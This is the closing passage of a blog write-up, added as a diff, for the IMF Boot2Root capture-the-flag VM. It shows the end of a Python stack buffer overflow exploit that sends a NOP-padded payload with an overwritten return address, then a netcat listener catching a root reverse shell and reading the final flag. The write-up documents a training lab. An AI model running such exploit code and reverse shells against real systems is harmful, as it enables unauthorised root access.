+<span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="mh">0x8048563</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">168</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ret</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="k">print</span> <span class="s">"[+] Sending payload of size </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span> <span class="s">"[+] check for shell"</span>
+</code></pre></div></div>
+
+<p>Upon firing it off, we got a shell as root and the final flag!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/tmp# nc -lnvp 4443
+listening on [any] 4443 ...
+connect to [192.168.1.60] from (UNKNOWN) [192.168.1.62] 47316
+id
+uid=0(root) gid=0(root) groups=0(root)
+bash -i
+bash: cannot set terminal process group (2019): Inappropriate ioctl for device
+bash: no job control in this shell
+root@imf:/# cd /root
+cd /root
+root@imf:/root# ls -l
+ls -l
+total 8
+-rw-r--r-- 1 root root  28 Oct 11 23:10 Flag.txt
+-rw-r--r-- 1 root root 947 Oct 26 18:57 TheEnd.txt
+root@imf:/root# cat Flag.txt
+cat Flag.txt
+flag6{R2gwc3RQcm90MGMwbHM=}
+root@imf:/root#
+
+root@imf:/root# cat TheEnd.txt
+cat TheEnd.txt
+   ____                        _ __   __   
+  /  _/_ _  ___  ___  ___ ___ (_) /  / /__
+ _/ //  ' \/ _ \/ _ \(_-&lt;(_-&lt;/ / _ \/ / -_)
+/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/
+   __  __/_/        _                      
+  /  |/  (_)__ ___ (_)__  ___              
+ / /|_/ / (_-&lt;(_-&lt;/ / _ \/ _ \             
+/_/__/_/_/___/___/_/\___/_//_/             
+  / __/__  ___________                     
+ / _// _ \/ __/ __/ -_)                    
+/_/  \___/_/  \__/\__/                     
+
+Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
+Thank you for trying this challenge and please send any feedback.
+
+Geckom
+Twitter: @g3ck0ma
+Email: geckom@redteamr.com
+Web: http://redteamr.com
+
+Special Thanks
+Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
+Web Advice: Menztrual (@menztrual)
+</code></pre></div></div>
+
+
+</div>
+
+<div class="pagination">
+  
+  
+    <a href="/2016-08-28/CYSTEME" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-24 19:06:05 -0600">2018</time> . Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+      </span>
+    </footer>
+  </body>
+</html>
